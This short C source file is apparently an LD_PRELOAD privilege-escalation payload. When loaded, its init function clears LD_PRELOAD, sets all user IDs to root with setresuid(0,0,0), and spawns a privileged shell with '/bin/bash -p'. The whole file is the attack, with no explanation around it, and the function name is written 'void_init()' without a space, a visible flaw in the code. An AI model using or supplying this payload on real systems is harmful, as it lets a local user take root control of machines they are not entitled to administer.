#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
